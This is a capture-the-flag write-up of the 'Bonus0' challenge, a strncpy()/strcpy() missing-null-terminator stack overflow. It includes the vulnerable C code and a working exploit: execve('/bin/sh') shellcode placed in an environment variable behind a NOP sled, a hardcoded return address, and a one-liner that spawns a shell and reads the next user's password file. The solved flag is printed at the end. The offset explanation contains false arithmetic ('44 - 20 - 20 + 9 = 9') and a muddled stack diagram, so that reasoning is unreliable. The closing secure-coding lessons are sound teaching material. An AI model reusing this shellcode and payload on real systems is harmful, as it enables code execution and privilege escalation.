# Bonus0 - The strncpy() Null Terminator Vulnerability

## Table of Contents
1. [Overview](#overview)
2. [The strncpy() Function](#the-strncpy-function)
3. [The Vulnerability](#the-vulnerability)
4. [Memory Layout Analysis](#memory-layout-analysis)
5. [Exploitation Strategy](#exploitation-strategy)
6. [Payload Construction](#payload-construction)
7. [Step-by-Step Execution](#step-by-step-execution)
8. [Why This Works](#why-this-works)
9. [Security Lessons](#security-lessons)

---

## Overview

**Challenge Type**: Buffer Overflow via Missing Null Terminator  
**Difficulty**: Intermediate  
**Technique**: strncpy() + strcpy() chain exploitation  
**Target**: Overwrite return address to execute shellcode

Bonus0 demonstrates a subtle but dangerous vulnerability: the interaction between `strncpy()` and `strcpy()` when null terminators are missing.

---

## The strncpy() Function

### Function Signature

```c
char *strncpy(char *dest, const char *src, size_t n);
```

### Behavior

`strncpy()` copies **up to** `n` characters from `src` to `dest`:

1. **If `strlen(src) < n`**: Copies all of `src` + pads with `\0` until `n` bytes
2. **If `strlen(src) >= n`**: Copies **exactly** `n` bytes, **NO null terminator!**

### The Danger

```c
char dest[20];
strncpy(dest, "12345678901234567890EXTRA", 20);
// dest = "12345678901234567890" (NO \0!)
// dest is NOT a valid C string!
```

### Common Misconception

Many developers think `strncpy()` is a "safe" version of `strcpy()`. **It's not!**

```c
// WRONG - dest may not be null-terminated!
strncpy(dest, src, sizeof(dest));

// CORRECT - ensure null termination
strncpy(dest, src, sizeof(dest) - 1);
dest[sizeof(dest) - 1] = '\0';
```

---

## The Vulnerability

### Vulnerable Code

```c
void p(char *dest, char *prompt) {
    char big_buffer[4104];
    char *newline_ptr;
    
    puts(prompt);
    read(0, big_buffer, 4096);
    newline_ptr = strchr(big_buffer, '\n');
    *newline_ptr = '\0';
    strncpy(dest, big_buffer, 20);  // ← BUG: No null terminator!
}

void pp(char *buff) {
    char str1[20];
    char str2[20];
    
    p(str1, " - ");
    p(str2, " - ");
    
    strcpy(buff, str1);  // ← OVERFLOW if str1 has no null terminator!
    
    size_t len = strlen(buff);
    buff[len] = ' ';
    buff[len + 1] = '\0';
    
    strcat(buff, str2);
}
```

### The Exploit Chain

1. **p() reads 4096 bytes** into `big_buffer`
2. **strncpy() copies exactly 20 bytes** to `dest`
3. **If input >= 20 chars**, `dest` has **NO null terminator**
4. **strcpy(buff, str1)** expects null-terminated string
5. **strcpy() keeps copying** past `str1` until it finds `\0`
6. **Copies str1 + str2 + stack data** → **buffer overflow!**

---

## Memory Layout Analysis

### Stack in pp() Function

```
Lower Memory Addresses
┌─────────────────────────────────┐
│ str1[0-19]                      │ ← 20 bytes, no null if full
├─────────────────────────────────┤
│ str2[0-19]                      │ ← 20 bytes, contains ret addr
├─────────────────────────────────┤
│ Saved EBP                       │ ← 4 bytes
├─────────────────────────────────┤
│ Return Address                  │ ← 4 bytes (TARGET!)
└─────────────────────────────────┘
Higher Memory Addresses
```

### Overflow Visualization

When both `str1` and `str2` have no null terminators:

```
strcpy(buff, str1) execution:

Source (stack):
[str1: 20 bytes][str2: 20 bytes][EBP: 4][RET: 4]

Destination (buff):
[54 bytes available]

Copy process:
1. Copy str1 (20 bytes) → buff[0-19]
2. No \0 found, continue
3. Copy str2 (20 bytes) → buff[20-39]
4. No \0 found, continue
5. Copy EBP (4 bytes) → buff[40-43]
6. Copy RET (4 bytes) → buff[44-47]  ← OVERFLOW!
7. Continue until \0 or crash
```

---

## Exploitation Strategy

### Goal

Overwrite the return address to point to shellcode in the environment.

### Approach

1. **Store shellcode in environment variable** (high memory address)
2. **First input**: Fill 4096-byte buffer to trigger no-null-terminator
3. **Second input**: Craft 20 bytes with return address at correct offset
4. **Trigger overflow**: strcpy() copies both inputs + overwrites return address
5. **Execute**: Function returns to shellcode

### Shellcode Placement

```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + shellcode')
```

- **NOP sled** (\x90 * 100): Increases hit probability
- **Shellcode**: execve("/bin/sh")
- **Location**: ~0xbfffff00 (environment variables)

### Return Address

Through testing, we found: **0xbffff8a0**

This address points into the NOP sled, which slides into the shellcode.

---

## Payload Construction

### First Input (4095 bytes)

```python
first_input = 'A' * 4095 + '\n'
```

**Purpose**: Fill the 4096-byte buffer in `p()`  
**Result**: `strncpy()` copies 20 'A's with **NO null terminator**

### Second Input (20 bytes)

```python
second_input = 'B' * 9 + '\xa0\xf8\xff\xbf' + 'C' * 7
```

**Structure**:
```
Offset | Size | Content        | Purpose
-------|------|----------------|---------------------------
0-8    | 9    | 'B' * 9        | Padding
9-12   | 4    | \xa0\xf8\xff\xbf | Return address (0xbffff8a0)
13-19  | 7    | 'C' * 7        | Padding
```

### Why Offset 9?

Through the overflow chain:
- `strcpy(buff, str1)` copies `str1` (20 bytes)
- Continues to `str2` (20 bytes)
- Total: 40 bytes copied before reaching saved EBP
- Return address is at offset 44 in `buff`
- In `str2`, this corresponds to offset 9 (44 - 20 - 20 + 9 = 9)

---

## Step-by-Step Execution

### 1. Setup

```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

### 2. Execute Exploit

```bash
(python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xa0\xf8\xff\xbf' + 'C'*7"; cat) | ./bonus0
```

### 3. Execution Flow

```
1. main() calls pp(buff)
2. pp() calls p(str1, " - ")
3. p() reads 4095 'A's
4. strncpy(str1, big_buffer, 20) → str1 = "AAAAAAAAAAAAAAAAAAAA" (no \0)
5. pp() calls p(str2, " - ")
6. p() reads "BBBBBBBBB\xa0\xf8\xff\xbfCCCCCCC"
7. strncpy(str2, big_buffer, 20) → str2 = "BBBBBBBBB\xa0\xf8\xff\xbfCCCCCCC"
8. pp() calls strcpy(buff, str1)
9. strcpy() copies:
   - str1 (20 bytes)
   - str2 (20 bytes) ← no \0, keeps going
   - Saved EBP (4 bytes)
   - Return address ← OVERWRITTEN with 0xbffff8a0
10. pp() returns
11. CPU jumps to 0xbffff8a0 (NOP sled)
12. CPU slides through NOPs
13. Shellcode executes
14. /bin/sh spawned as bonus1 user
```

### 4. Get Flag

```bash
cat /home/user/bonus1/.pass
```

---

## Why This Works

| Protection | Status | Impact |
|------------|--------|--------|
| NX (DEP) | Disabled | Stack is executable |
| ASLR | Disabled | Addresses are predictable |
| Stack Canary | None | No overflow detection |
| RELRO | None | Not relevant |

---

## Security Lessons

### 1. strncpy() Is NOT Safe

```c
// DANGEROUS
strncpy(dest, src, sizeof(dest));
strcpy(other, dest);  // May overflow!

// SAFE
strncpy(dest, src, sizeof(dest) - 1);
dest[sizeof(dest) - 1] = '\0';
```

### 2. Better Alternatives

```c
// Option 1: strlcpy (BSD)
strlcpy(dest, src, sizeof(dest));

// Option 2: snprintf
snprintf(dest, sizeof(dest), "%s", src);

// Option 3: C++ std::string
std::string dest = src;  // Always safe
```

### 3. Always Validate

```c
void safe_copy(char *dest, const char *src, size_t dest_size) {
    if (dest_size == 0) return;
    
    strncpy(dest, src, dest_size - 1);
    dest[dest_size - 1] = '\0';  // Ensure null termination
}
```

### 4. Enable Protections

```bash
gcc -fstack-protector-all \  # Stack canaries
    -D_FORTIFY_SOURCE=2 \     # Buffer overflow checks
    -Wl,-z,relro,-z,now \     # RELRO
    -pie -fPIE                # PIE/ASLR
```

---

## Flag

```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

